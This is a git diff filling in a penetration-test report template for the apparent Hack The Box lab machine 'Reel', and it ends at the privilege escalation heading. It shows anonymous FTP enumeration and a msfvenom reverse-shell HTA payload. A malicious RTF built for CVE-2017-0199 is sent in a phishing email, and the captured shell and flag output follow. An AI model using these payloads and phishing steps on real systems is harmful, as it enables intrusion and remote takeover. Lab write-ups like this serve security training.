@@ -1,10 +1,10 @@
 # Reel
 
-## Official Report
+## Penetration Test Report
 
 ### Introduction
 
-The penetration test report contains all efforts that were conducted during client engagement. The purpose of this report is to ensure that the client has a full understanding of penetration testing methodologies as well as the technical knowlegde to remediate any security flaws.
+The penetration test report contains all efforts that were conducted during client engagement. The purpose of this report is to ensure that the client has a full understanding of penetration testing methodologies as well as the technical knowledge to remediate any security flaws.
 
 ### Objective
 
@@ -49,13 +49,13 @@ The penetration testing portions of the assessment focus heavily on gaining acce
 
 #### System IP: 10.129.15.19
 
-**Service Enumeration**
+#### **Service Enumeration**
 
 The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.
 
 | Server IP Address | Ports Open                              |
 | ----------------- | --------------------------------------- |
-| 10.129.15.19      | **TCP**: 21,22,25,135,139,445,593,491,5 |
+| 10.129.15.19      | **TCP**: 21,22,25,135,139,445,593,49159 |
 |                   | **UDP**:                                |
 
 **Nmap Scan Results:**
@@ -291,9 +291,7 @@ Nmap done: 1 IP address (1 host up) scanned in 216.79 seconds
            Raw packets sent: 92 (7.756KB) | Rcvd: 38 (2.392KB)
 ```
 
-_Initial Shell_
-
-_Additional info about where the initial shell was acquired from_
+_Initial Shell -_ Microsoft Office/WordPad Remote Code Execution Vulnerability (_CVE_-2017-0199)
 
 **Vulnerability Explanation:**
 
@@ -301,11 +299,266 @@ _Additional info about where the initial shell was acquired from_
 
 **Severity:**
 
-**Proof of Concept Code Here:**
+**Proof of Concept:**
+
+I see ftp allows anonymous logins and can see that there are files of interest
+
+```
+┌──[Mon Nov  7 11:47:25 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# ftp $ip                                      
+Connected to 10.129.15.19.
+220 Microsoft FTP Service
+Name (10.129.15.19:pentester): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> passive
+Passive mode: off; fallback to active mode: off.
+ftp> binary
+200 Type set to I.
+ftp> ls
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+05-28-18  11:19PM       <DIR>          documents
+226 Transfer complete.
+ftp> cd documents
+250 CWD command successful.
+ftp> ls
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+05-28-18  11:19PM                 2047 AppLocker.docx
+05-28-18  01:01PM                  124 readme.txt
+10-31-17  09:13PM                14581 Windows Event Forwarding.docx
+226 Transfer complete.
+```
+
+I proceed to download the readme.txt file and the word document
+
+```
+ftp> get readme.txt
+local: readme.txt remote: readme.txt
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+100% |*********************************************************************************************************************|   124        2.04 KiB/s    00:00 ETA
+226 Transfer complete.
+124 bytes received in 00:00 (1.02 KiB/s)
+ftp> get "Windows Event Forwarding.docx"
+local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+100% |*********************************************************************************************************************| 14581       51.00 KiB/s    00:00 ETA
+226 Transfer complete.
+14581 bytes received in 00:00 (41.55 KiB/s)
+```
+
+Reading the readme file indicates that a user is reading word documents which also indicates for a potential phishing attack
+
+```
+┌──[Mon Nov  7 11:53:54 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# cat readme.txt 
+please email me any rtf format procedures - I'll review and convert.
+
+new format / converted documents will be saved here.
+```
+
+Furthermore, reading the output from using exiftool on the word document reveals user/email address
+
+```
+┌──[Tue Nov  8 12:02:28 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# exiftool Windows\ Event\ Forwarding.docx 
+ExifTool Version Number         : 12.42
+File Name                       : Windows Event Forwarding.docx
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2017:10:31 16:13:23-05:00
+File Access Date/Time           : 2022:11:07 23:48:32-06:00
+File Inode Change Date/Time     : 2022:11:07 23:48:32-06:00
+File Permissions                : -rw-r--r--
+File Type                       : DOCX
+File Type Extension             : docx
+MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x82872409
+Zip Compressed Size             : 385
+Zip Uncompressed Size           : 1422
+Zip File Name                   : [Content_Types].xml
+Creator                         : nico@megabank.com
+Revision Number                 : 4
+Create Date                     : 2017:10:31 18:42:00Z
+Modify Date                     : 2017:10:31 18:51:00Z
+Template                        : Normal.dotm
+Total Edit Time                 : 5 minutes
+Pages                           : 2
+Words                           : 299
+Characters                      : 1709
+Application                     : Microsoft Office Word
+Doc Security                    : None
+Lines                           : 14
+Paragraphs                      : 4
+Scale Crop                      : No
+Heading Pairs                   : Title, 1
+Titles Of Parts                 : 
+Company                         : 
+Links Up To Date                : No
+Characters With Spaces          : 2004
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 14.0000
+```
+
+With this information I proceed to utilize the [CVE-2017-0199 Exploit toolkit ](https://github.com/bhdresh/CVE-2017-0199)by creating the HTA and RTF payloads
+
+```
+┌──[Mon Nov  7 11:56:53 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# msfvenom -p windows/shell_reverse_tcp LHOST=$tun0 LPORT=443 -f hta-psh -o thescriptkid.hta
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of hta-psh file: 7368 bytes
+Saved as: thescriptkid.hta
+                                                                                                                                                                  
+┌──[Mon Nov  7 11:58:24 PM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# python2 /opt/CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -t RTF -w DNS.RTF -u http://$tun0/thescriptkid.hta
+Generating normal RTF payload.
+
+Generated DNS.RTF successfully
+```
+
+Starting the webserver and netcat listener
+
+```
+┌──[Tue Nov  8 12:01:01 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# python3 -m http.server 80                                                                                    
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+┌──[Tue Nov  8 12:02:37 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# nc -lnvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+```
+
+Sending our malicious email and gaining initial foothold
+
+```
+┌──[Tue Nov  8 12:03:42 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# sendEmail -f thescriptkid@megabank.com -t nico@megabank.com -u "Subject" -m "Message" -a DNS.RTF -s $ip -v
+Nov 08 00:10:00 localhost sendEmail[729161]: DEBUG => Connecting to 10.129.15.19:25
+Nov 08 00:10:00 localhost sendEmail[729161]: DEBUG => My IP address is: 10.10.16.2
+Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	220 Mail Service ready
+Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	EHLO localhost
+Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
+Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	MAIL FROM:<thescriptkid@megabank.com>
+Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	250 OK
+Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	RCPT TO:<nico@megabank.com>
+Nov 08 00:10:00 localhost sendEmail[729161]: SUCCESS => Received: 	250 OK
+Nov 08 00:10:00 localhost sendEmail[729161]: INFO => Sending: 	DATA
+Nov 08 00:10:01 localhost sendEmail[729161]: SUCCESS => Received: 	354 OK, send.
+Nov 08 00:10:01 localhost sendEmail[729161]: INFO => Sending message body
+Nov 08 00:10:01 localhost sendEmail[729161]: Setting content-type: text/plain
+Nov 08 00:10:01 localhost sendEmail[729161]: DEBUG => Sending the attachment [DNS.RTF]
+Nov 08 00:10:13 localhost sendEmail[729161]: SUCCESS => Received: 	250 Queued (12.281 seconds)
+Nov 08 00:10:13 localhost sendEmail[729161]: Email was sent successfully!  From: <thescriptkid@megabank.com> To: <nico@megabank.com> Subject: [Subject] Attachment(s): [DNS.RTF] Server: [10.129.15.19:25]
+
+```
+
+```
+┌──[Tue Nov  8 12:01:01 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# python3 -m http.server 80                                                                                    
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.15.19 - - [08/Nov/2022 00:10:22] "GET /thescriptkid.hta HTTP/1.1" 200 -
+
+```
+
+```
+┌──[Tue Nov  8 12:02:37 AM CST 2022]-[TheScriptKid]-[/tmp]
+├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
+└──# nc -lnvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.129.15.19.
+Ncat: Connection from 10.129.15.19:50048.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
 
 **Local.txt Proof Screenshot**
 
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>user proof</p></figcaption></figure>
+
 **Local.txt Contents**
+
+```
+C:\Users\nico\Desktop>hostname && whoami && type user.txt && ipconfig /all
+hostname && whoami && type user.txt && ipconfig /all
+REEL
+htb\nico
+fa363aebcfa2c29897a69af385fee971
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : REEL
+   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : HTB.LOCAL
+                                       htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-E7-88
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::17d(Preferred) 
+   Lease Obtained. . . . . . . . . . : 08 November 2022 04:03:15
+   Lease Expires . . . . . . . . . . : 08 November 2022 07:33:15
+   IPv6 Address. . . . . . . . . . . : dead:beef::38b5:a806:d0b6:bce2(Preferred) 
+   Link-local IPv6 Address . . . . . : fe80::38b5:a806:d0b6:bce2%14(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 10.129.15.19(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : 08 November 2022 04:03:27
+   Lease Expires . . . . . . . . . . : 08 November 2022 07:33:27
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%14
+                                       10.129.0.1
+   DHCP Server . . . . . . . . . . . : 10.129.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 335564886
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-AD-9E-CA-00-50-56-B9-50-75
+   DNS Servers . . . . . . . . . . . : 1.1.1.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+C:\Users\nico\Desktop>
+```
 
 **Privilege Escalation**
 
